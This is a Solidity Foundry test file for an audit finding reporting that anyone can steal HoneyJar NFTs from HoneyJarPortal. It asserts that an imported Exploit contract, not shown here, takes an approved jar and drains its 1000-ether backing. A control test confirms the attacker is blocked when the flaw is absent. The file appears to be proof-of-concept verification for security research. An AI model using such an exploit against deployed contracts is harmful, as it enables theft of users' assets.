// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import {Exploit, HoneyJar} from "./20529-c-01-anyone-can-steal-all-honeyjar-nfts-in-honeyjarportal-an.sol";

contract Finding20529Test is Test {
    function test_anyone_pulls_approved_jar_and_takes_backing() public {
        Exploit e = new Exploit();
        e.run();

        HoneyJar jar = e.jar();
        assertEq(e.ownerBefore(), address(e.collector()), "collector owned it");
        assertEq(e.ownerAfter(), address(e), "attacker received it");
        assertEq(jar.ownerOf(1), address(e), "ownerOf moved");
        assertEq(e.attackerGot(), 1000 ether, "attacker took 1000");
        assertEq(e.jarLeft(), 0, "jar emptied");
        assertEq(e.pay().balanceOf(address(e)), 1000 ether, "exploit balance");

        console2.log("attacker got", e.attackerGot());
        console2.log("owner after", e.ownerAfter());
    }

    function test_control_requires_owner() public {
        Exploit e = new Exploit();
        e.runControl();

        assertTrue(e.controlBlocked(), "attacker blocked");
        assertTrue(e.controlOwnerSent(), "owner still sent");
        assertEq(e.controlBackingLeft(), 1000 ether, "backing stayed until owner acted");
        assertEq(e.pay().balanceOf(address(e)), 0, "attacker unpaid");

        console2.log("control blocked", e.controlBlocked());
        console2.log("owner sent", e.controlOwnerSent());
    }
}
